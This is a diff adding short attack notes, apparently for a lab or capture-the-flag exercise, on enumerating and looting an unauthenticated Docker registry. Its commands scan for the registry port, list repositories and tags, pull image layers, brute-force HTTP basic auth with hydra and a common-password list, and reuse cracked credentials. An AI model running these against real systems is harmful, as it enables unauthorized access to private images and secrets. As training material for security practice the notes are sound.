@@ -1,0 +1,22 @@
+//scan for docker registry
+nmap -sS -Pn -p 5000
+
+//list all repos in the registry
+curl http://192.10.151.3:5000/v2/_catalog
+
+//list all tags in registry
+curl http://192.10.151.3:5000/v2/flag/tags/list
+
+//pull manifests
+curl http://192.143.152.3:5000/v2/treasure-trove/manifests/latest
+
+//pull all layers and save to .tar
+curl -s
+http://192.143.152.3:5000/v2/treasure-trove/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae09
+3a39381e05d08ca75ed27cae94125f935 --output 1.tar
+
+//brute the basic auth
+hydra -l bob -P wordlists/100-common-passwords.txt 192.177.254.3 http-get /
+
+//with basic auth
+curl -k -u alice:chicago https://192.2.162.3:5000/v2/treasure-hunt/tags/list
